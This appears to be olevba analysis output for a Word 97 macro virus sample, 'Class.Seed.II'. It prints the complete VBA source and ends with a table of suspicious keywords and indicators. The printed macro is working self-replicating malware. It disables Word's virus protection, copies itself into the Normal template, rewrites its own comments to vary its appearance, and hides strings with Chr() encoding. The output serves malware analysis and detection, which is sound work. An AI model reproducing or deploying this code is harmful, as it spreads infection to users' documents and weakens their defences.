olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.y
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.y - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'81376636814662431524813766368146624315248137663681466243152481376636814662431524
Randomize
'13795058788950044821849137950587889500448218491379505878895004482184913795058788950044821849
x = 0: o = 0
'1113316648962304576036111331664896230457603611133166489623045760361113316648962304576036
On Error GoTo 93
'1116044344947024789904111604434494702478990411160443449470247899041116044344947024789904
Options.VirusProtection = False
'478199910423045061636478199910423045061636478199910423045061636478199910423045061636
Options.SaveNormalPrompt = False
'952024854012117472256952024854012117472256952024854012117472256952024854012117472256
Options.ConfirmConversions = False
'992892673651208974436992892673651208974436992892673651208974436992892673651208974436
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'3154353602516682047281315435360251668204728131543536025166820472813154353602516682047281
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'1456680024929181180625145668002492918118062514566800249291811806251456680024929181180625
If xf > 96 And fx > 0 Then GoTo 93
'6512959202532271607449651295920253227160744965129592025322716074496512959202532271607449
If xf < 96 Then
'4685363284921777790329468536328492177779032946853632849217777903294685363284921777790329
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'1884662208923522663641188466220892352266364118846622089235226636411884662208923522663641
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'107439728420437561600107439728420437561600107439728420437561600107439728420437561600
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'1042230828965712336400104223082896571233640010422308289657123364001042230828965712336400
End If
'50717186563576040000507171865635760400005071718656357604000050717186563576040000
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'1550896622526391951936155089662252639195193615508966225263919519361550896622526391951936
k = Int(Rnd(1) * 100) + 1
'6561026102510869730564656102610251086973056465610261025108697305646561026102510869730564
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'154313537293393878049154313537293393878049154313537293393878049154313537293393878049
l = Int(Rnd(1) * 75) + 1
'478795665962752261444478795665962752261444478795665962752261444478795665962752261444
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'81527380900335878929815273809003358789298152738090033587892981527380900335878929
m = Int(Rnd(1) * 50) + 1
'746133164151586674129746133164151586674129746133164151586674129746133164151586674129
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'35129255184799984656351292551847999846563512925518479998465635129255184799984656
n = Int(Rnd(1) * 25) + 1
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(32) + Chr(73) + Chr(73)
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For p = 1 To 4
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .deletelines 1
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    Next p
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If xf < 96 Then
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline 1, "Sub AutoClose()"
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline 99, "Sub ToolsMacro()"
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End If
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For p = 2 To 44 Step 2
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    x = Int(Rnd(414835) * 403989) + 8485
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    o = Int(Rnd(298368) * 235865) + 2988
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline p, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Next p
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For xp = 46 To 98 Step 2
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline xp, "'" & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Next xp
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
93:
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If xf > 98 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End Sub
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Sub ViewVBCode()
'Word97/Class.Seed.II by Virus :) Smile!
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+

